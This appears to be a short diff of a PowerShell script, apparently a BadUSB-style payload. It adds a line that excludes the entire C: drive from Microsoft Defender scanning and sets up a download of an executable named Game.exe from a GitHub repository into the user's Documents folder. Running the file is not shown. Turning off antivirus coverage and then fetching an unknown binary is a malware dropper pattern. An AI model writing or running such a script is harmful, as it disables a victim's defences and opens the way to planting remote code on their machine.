@@ -1,4 +1,4 @@
-
+Add-MpPreference -ExclusionPath "C:\"
 
 $url = "https://github.com/knoxoxen/flipperstuffs/raw/main/Game.exe"
 $destination = "$env:USERPROFILE\Documents\Game.exe"
